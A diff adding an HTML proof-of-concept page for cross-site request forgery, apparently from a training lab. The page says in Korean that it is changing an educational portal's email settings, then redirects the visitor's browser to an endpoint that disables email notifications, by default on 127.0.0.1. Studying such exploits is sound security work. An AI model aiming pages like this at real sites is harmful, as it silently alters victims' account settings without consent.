@@ -1,0 +1,16 @@
+<!doctype html>
+<html lang="ko">
+<head>
+  <meta charset="utf-8">
+  <title>S09 CSRF PoC</title>
+</head>
+<body>
+  <p>교육용 포털의 이메일 알림 설정을 변경하는 중입니다.</p>
+  <script>
+    const params = new URLSearchParams(location.search)
+    const portal = params.get('portal') || 'http://127.0.0.1:11191'
+    const target = new URL('/api/citizens/preferences/email?enabled=false', portal)
+    location.replace(target.href)
+  </script>
+</body>
+</html>
